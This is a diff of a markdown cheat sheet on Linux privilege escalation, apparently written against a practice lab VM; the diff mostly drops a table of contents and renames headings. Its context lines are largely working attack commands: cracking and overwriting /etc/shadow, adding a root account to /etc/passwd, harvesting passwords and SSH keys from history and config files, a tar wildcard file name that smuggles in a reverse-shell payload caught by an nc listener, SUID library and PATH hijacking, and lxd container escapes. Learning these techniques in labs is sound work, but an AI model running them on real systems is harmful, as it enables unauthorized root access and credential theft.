@@ -1,38 +1,5 @@
 # Linux Privlage Escalation
 ## Table of Contents
-- [Linux Privlage Escalation](#linux-privlage-escalation)
-  * [Table of Contents](#table-of-contents)
-    + [Basic Enumeration](#basic-enumeration)
-    + [Weak File Permissions](#weak-file-permissions)
-      - [Readable /etc/shadow](#readable--etc-shadow)
-      - [Writeable /etc/shadow](#writeable--etc-shadow)
-      - [Writable /etc/passwd](#writable--etc-passwd)
-    + [Passwords & Keys](#passwords---keys)
-      - [History Files](#history-files)
-      - [Config Files](#config-files)
-      - [Keys-SSH Keys](#keys-ssh-keys)
-    + [Sudo-Shell escape Sequences](#sudo-shell-escape-sequences)
-    + [Sudo Environment Variables](#sudo-environment-variables)
-    + [Cron Jobs -File permissions](#cron-jobs--file-permissions)
-    + [Cron Jobs Path Environment Variable](#cron-jobs-path-environment-variable)
-    + [CronJobs - Wildcards](#cronjobs---wildcards)
-    + [SUID/SGID Executables --Known Exploits](#suid-sgid-executables---known-exploits)
-    + [SUID/SGID Executables-Shared Object Injection](#suid-sgid-executables-shared-object-injection)
-    + [SUID/SGID Executables-Environment Variables](#suid-sgid-executables-environment-variables)
-    + [SUID/SGID Executables-Abusing Shell Features #1](#suid-sgid-executables-abusing-shell-features--1)
-    + [SUID/SGID Executables-Abusing Shell Features #2](#suid-sgid-executables-abusing-shell-features--2)
-    + [NFS](#nfs)
-    + [Service Exploits](#service-exploits)
-    + [Docker Linux Local PE](#docker-linux-local-pe)
-    + [lxd Group Priv Esc](#lxd-group-priv-esc)
-        * [Errors - on the vulnerable server](#errors---on-the-vulnerable-server)
-    + [Capabilities](#capabilities)
-      - [Python](#python)
-      - [Perl](#perl)
-      - [Tar](#tar)
-
-<small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>
-
 ### Basic Enumeration
 ````
 whoami
@@ -49,7 +16,7 @@ searchsploit linux kernel 3.9
 ````
 - To remove DoS exploits by adding -exclude=”/dos/”
 ### Weak File Permissions
-#### Readable /etc/shadow
+#### Readable shadow
 ```
 ls -l /etc/shadow
 cat /etc/shadow
@@ -63,7 +30,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 su root
 ```
-#### Writeable /etc/shadow
+#### Writeable shadow
 ```
 ls -l /etc/shadow
 ```
@@ -76,7 +43,7 @@ mkpasswd -m sha-512 jackiscool
 ```
 su root
 ```
-#### Writable /etc/passwd
+#### Writable passwd
 - The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
 - The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. 
 ````
@@ -96,7 +63,7 @@ su root
 ````
 su newroot
 ````
-### Passwords & Keys
+### Passwords and Keys
 #### History Files
 - If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
 - View the contents of all the hidden history files in the user's home directory:
@@ -119,7 +86,7 @@ cat /home/user/myvpn.ovpn
 ````
 su root
 ````
-#### Keys-SSH Keys
+#### SSH Keys
 - Sometimes users make backups of important files but fail to secure them with the correct permissions.
 - Look for hidden files & directories in the system root:
 ````
@@ -301,7 +268,7 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 ````
 nc -nvlp 4444
 ````
-### SUID/SGID Executables --Known Exploits
+### SUID and SGID Executables --Known Exploits
 - Find all the SUID/SGID executables on the Debian VM:
 ````
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -332,7 +299,7 @@ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc
 ````
 /usr/local/bin/suid-so
 ````
-### SUID/SGID Executables-Environment Variables
+### SUID and SGID Executables-Environment Variables
 - The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
 - First, execute the file and note that it seems to be trying to start the apache2 webserver:
 ````
@@ -351,7 +318,7 @@ gcc -o service /home/user/tools/suid/service.c
 ````
 PATH=.:$PATH /usr/local/bin/suid-env
 ````
-### SUID/SGID Executables-Abusing Shell Features #1
+### SUID and SGID Executables-Abusing Shell Features 1
 - The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable `/usr/sbin/service` to start the apache2 webserver.
 Verify this with strings:
 ````
@@ -371,7 +338,7 @@ export -f /usr/sbin/service
 ````
 /usr/local/bin/suid-env2
 ````
-### SUID/SGID Executables-Abusing Shell Features #2
+### SUID and SGID Executables-Abusing Shell Features 2
 - Note: This will not work on Bash versions 4.4 and above.
 - When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
 - Run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of `/bin/bash`:
@@ -517,7 +484,7 @@ lxc exec privesc /bin/sh
 cd /mnt/root
 ```
 - `/mnt/root` is where the file system is mounted.
-##### Errors - on the vulnerable server
+##### Errors-on the vulnerable server
 - If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
 - You need to initialize lxd before using it
 ```
